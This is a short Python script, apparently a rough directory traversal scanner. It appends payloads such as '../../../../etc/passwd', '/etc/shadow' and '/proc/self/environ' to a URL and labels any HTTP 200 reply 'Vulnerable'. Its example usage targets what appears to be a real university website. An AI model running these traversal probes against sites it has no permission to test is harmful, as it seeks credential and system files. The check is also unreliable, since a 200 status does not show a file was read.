# waf to test the directory traversal vulnerability, when a url is given as input
 
import requests

def test_directory_traversal(url):
    # List of common sensitive files to check for
    sensitive_files = [
        "/etc/passwd",
        "../../../../../../../../../etc/passwd",
        "/etc/shadow",
        "../../../../../../../../../etc/shadow",
        "/proc/self/environ",
        "../../../../../../../../../proc/self/environ",
        "/proc/version",
        "../../../../../../../../../proc/version",
        "/proc/cmdline",
        "../../../../../../../../../proc/cmdline",
        "/proc/mounts",
        "../../../../../../../../../proc/mounts",
        "/proc/net/tcp",
        "../../../../../../../../../proc/net/tcp",
        "/proc/net/udp",
        "../../../../../../../../../proc/net/udp",
        "/proc/net/raw",
        "../../../../../../../../../proc/net/raw",
        "/proc/net/unix",
        "../../../../../../../../../proc/net/unix",
    ]

    # Initialize a dictionary to store results
    results = {}

    # Send requests to test for directory traversal vulnerability
    for file_path in sensitive_files:
        test_url = url + file_path
        try:
            response = requests.get(test_url)
            if response.status_code == 200:
                results[file_path] = "Vulnerable"
            else:
                results[file_path] = "Not Vulnerable"
        except requests.exceptions.RequestException:
            results[file_path] = "Error"

    return results

if __name__ == "__main__":
    # Example usage
    website_url = "http://bbdu.ac.in/"
    directory_traversal_results = test_directory_traversal(website_url)
    print("Directory Traversal Test Results:")
    results = {}
    for file_path, result in directory_traversal_results.items():
        results[file_path] = result
    print(results)


# django model for storing the directory traversal test results
